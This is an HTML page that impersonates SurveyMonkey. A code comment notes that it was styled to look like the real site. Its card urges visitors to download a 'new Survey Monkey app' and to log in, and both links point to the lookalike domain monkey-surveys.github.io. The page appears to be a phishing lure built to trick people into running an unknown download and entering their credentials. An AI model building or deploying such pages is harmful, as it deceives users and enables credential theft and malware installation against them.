<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <!-- Google Font to look more similar to SurveyMonkey -->
    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <style>
      .card-title {
        font-family: 'Work Sans', sans-serif;
        font-weight: 325;
        font-size: 2.2rem;
      }
      .default-text {
        font-family: 'Work Sans', sans-serif;
        font-weight: 300;
      }
      .label-text {
        font-family: 'Work Sans', sans-serif;
        font-weight: 360;
      }
      .btn-primary:focus {
        outline-color: #03bf6f !important;
      }
    </style>
    <title>Survey Monkey</title>
  </head>
  <body style="background-color: #f7f8fa;" class="bg-light d-flex justify-content-center align-items-center vh-100">
    <div>
      <div class="text-center">
        <img src="monkey-survey-logo.png" style="max-width: 380px;" alt="Logo" class="mb-3 text-center">
      </div>
      <div class="card shadow p-4" style="max-width: 420px; width: 100%;">
        <div class="card-body">
          <h3 class="card-title mb-4">Wait!</h3>
          <p class="default-text">For the best experience, please download new the Survey Monkey app.</p>
          <a href="https://monkey-surveys.github.io/download">
            <button type="submit" style="background-color: #03bf6f; color: white;" class="label-text btn btn-block">Download</button>
          </a>
        </div>
      </div>
      <div class="text-center" style="padding: 1rem">
        <small class="default-text">To continue in browser, please <a href="https://monkey-surveys.github.io/login">log in</a></small>
      </div>
    </div>
    
    <!-- Bootstrap JavaScript -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  </body>
</html>
